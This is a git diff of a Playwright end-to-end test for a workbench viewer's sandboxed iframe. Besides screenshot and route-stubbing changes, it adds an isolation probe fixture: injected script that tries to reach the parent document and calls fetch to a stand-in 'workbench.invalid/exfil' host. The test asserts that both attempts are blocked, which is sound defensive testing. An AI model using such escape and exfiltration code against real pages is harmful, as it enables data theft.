@@ -1,22 +1,45 @@
 import { expect, test } from '../fixtures/dev-backend';
-import type { Page } from '@playwright/test';
+import type { Page, TestInfo } from '@playwright/test';
 import * as fs from 'node:fs';
 import * as path from 'node:path';
 import { setTheme } from '../helpers/theme';
 
-const RESULTS_DIR = path.resolve(__dirname, '..', '..', '..', 'results');
+function evidencePath(testInfo: TestInfo, fileName: string): string {
+  const jobResultsDir = process.env['JOB_RESULTS_DIR']?.trim();
+  if (!jobResultsDir) return testInfo.outputPath(fileName);
+  const resultsDir = path.resolve(jobResultsDir);
+  fs.mkdirSync(resultsDir, { recursive: true });
+  return path.join(resultsDir, fileName);
+}
 
 async function proxyBackend(page: Page, baseUrl: string): Promise<void> {
   await page.route('**/healthz', route => route.fulfill({ status: 200, body: 'Healthy' }));
   await page.route('**/api/**', async route => {
     const url = new URL(route.request().url());
-    const response = await route.fetch({ url: `${baseUrl}${url.pathname}${url.search}` });
+    const json = (body: unknown) => route.fulfill({
+      status: 200, contentType: 'application/json', body: JSON.stringify(body),
+    });
+    // Keep app-wide boot probes out of this project-surface test. In
+    // particular, model discovery may invoke a slow external CLI and a dirty
+    // verification worktree may legitimately have a crash-recovery prompt.
+    if (/^\/api\/cli\/[^/]+\/models$/.test(url.pathname))
+      return json({ models: [], source: 'workbench-e2e' });
+    if (url.pathname === '/api/cli/quota')
+      return json({ at: new Date().toISOString(), ttlSeconds: 600, snapshots: [] });
+    if (url.pathname === '/api/cli/usage')
+      return json({ at: new Date().toISOString(), sessions: [] });
+    if (url.pathname === '/api/crash-recovery/pending')
+      return json({ pending: [] });
+    const response = await route.fetch({
+      url: `${baseUrl}${url.pathname}${url.search}`,
+      timeout: 30_000,
+    });
     await route.fulfill({ response });
   });
 }
 
-test('Workbench Explorer, isolated viewer, and Pulse thinking inbox use real repository artifacts in both themes', async ({ page, devBackend }) => {
-  fs.mkdirSync(RESULTS_DIR, { recursive: true });
+test('Workbench Explorer, isolated viewer, and Pulse thinking inbox use real repository artifacts in both themes', async ({ page, devBackend }, testInfo) => {
+  test.setTimeout(180_000);
   const pathsResponse = await fetch(`${devBackend.baseUrl}/api/watch-paths`);
   expect(pathsResponse.ok).toBe(true);
   const paths = await pathsResponse.json() as { name: string; rootPath?: string }[];
@@ -85,22 +108,68 @@ test('Workbench Explorer, isolated viewer, and Pulse thinking inbox use real rep
   await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-pipeline-workbench`)).toBeVisible();
   await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-workbench-mockup-family`)).toBeVisible();
   await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-app-survey`)).toBeVisible();
+  await expect(page.getByTestId(`studio-explorer-workbench-${project.name}-decoupled-lifecycles`)).toBeVisible();
   await expect(page.getByTestId(`studio-explorer-workbench-history-${project.name}`)).toBeVisible();
 
   for (const theme of ['light', 'dark'] as const) {
     await setTheme(page, theme);
-    await page.screenshot({ path: path.join(RESULTS_DIR, `workbench-explorer-${theme}.png`), fullPage: true });
+    await page.screenshot({ path: evidencePath(testInfo, `workbench-explorer-${theme}.png`), fullPage: true });
   }
 
-  await page.getByTestId(`studio-explorer-workbench-${project.name}-app-survey`).click();
+  await page.getByTestId(`studio-explorer-workbench-${project.name}-decoupled-lifecycles`).click();
   const frame = page.getByTestId('workbench-viewer-frame');
   await expect(frame).toBeVisible();
   await expect(frame).toHaveAttribute('sandbox', 'allow-scripts');
+  await expect(page.getByTestId('workbench-viewer-provenance')).toContainText('docs/concepts/mockups/decoupled-lifecycles.html');
+  await expect(page.frameLocator('[data-testid="workbench-viewer-frame"]')
+    .getByRole('heading', { name: 'The screen is a guest, not the owner.' })).toBeVisible();
+  for (const theme of ['light', 'dark'] as const) {
+    await setTheme(page, theme);
+    await page.screenshot({ path: evidencePath(testInfo, `workbench-decoupled-${theme}.png`), fullPage: true });
+  }
+
+  let escapedNetworkRequests = 0;
+  page.on('request', request => {
+    if (new URL(request.url()).hostname === 'workbench.invalid') escapedNetworkRequests += 1;
+  });
+  await page.route('**/workbenches/app-survey', route => route.fulfill({
+    json: {
+      workbench: {
+        id: 'app-survey', title: 'Isolation probe', summary: 'Security-boundary test fixture.',
+        status: 'active', phase: 'testing', updatedAtUtc: '2026-07-12T10:00:00Z',
+        entryPath: 'docs/design/app-survey-2026-07-11.html', valid: true, error: null, sourceTaskKeys: [],
+      },
+      html: `<script id="early-probe">
+        document.documentElement.dataset.scriptRan = 'true';
+        try {
+          parent.document.documentElement.dataset.workbenchEscaped = 'true';
+          document.documentElement.dataset.parentAccess = 'escaped';
+        } catch {
+          document.documentElement.dataset.parentAccess = 'blocked';
+        }
+        fetch('https://workbench.invalid/exfil').then(
+          () => document.documentElement.dataset.network = 'allowed',
+          () => document.documentElement.dataset.network = 'blocked'
+        );
+      </script><html><head><base href="https://base.invalid/"><meta http-equiv="Content-Security-Policy" content="default-src *"></head><body><h1>Isolation probe</h1></body></html>`,
+      branch: 'develop', revision: null, workingTreeModified: true,
+    },
+  }));
+  await page.getByTestId(`studio-explorer-workbench-${project.name}-app-survey`).click();
   const srcdoc = await frame.getAttribute('srcdoc');
   expect(srcdoc).toContain("default-src 'none'");
   expect(srcdoc).toContain("connect-src 'none'");
   expect(srcdoc).not.toContain('allow-same-origin');
+  expect(srcdoc).not.toContain('https://base.invalid/');
+  expect(srcdoc!.indexOf('Content-Security-Policy')).toBeLessThan(srcdoc!.indexOf('id="early-probe"'));
+  const isolatedRoot = page.frameLocator('[data-testid="workbench-viewer-frame"]').locator('html');
+  await expect(isolatedRoot).toHaveAttribute('data-script-ran', 'true');
+  await expect(isolatedRoot).toHaveAttribute('data-parent-access', 'blocked');
+  await expect(isolatedRoot).toHaveAttribute('data-network', 'blocked');
+  await expect(page.locator('html')).not.toHaveAttribute('data-workbench-escaped', 'true');
+  expect(escapedNetworkRequests).toBe(0);
   await expect(page.getByTestId('workbench-viewer-provenance')).toContainText('docs/design/app-survey-2026-07-11.html');
+  await expect(page.getByTestId('workbench-viewer-working-tree')).toContainText('uncommitted');
 
   await page.getByTestId(`studio-explorer-project-wiki-${project.name}`).click();
   await expect(page.getByTestId('project-wiki-pulse-workbenches')).toBeVisible();
@@ -110,7 +179,7 @@ test('Workbench Explorer, isolated viewer, and Pulse thinking inbox use real rep
   await page.getByTestId('project-wiki-meta-toggle').click();
   for (const theme of ['light', 'dark'] as const) {
     await setTheme(page, theme);
-    await page.screenshot({ path: path.join(RESULTS_DIR, `workbench-pulse-${theme}.png`), fullPage: true });
+    await page.screenshot({ path: evidencePath(testInfo, `workbench-pulse-${theme}.png`), fullPage: true });
   }
 
   await page.getByTestId('project-wiki-pulse-workbench-pipeline-workbench').click();
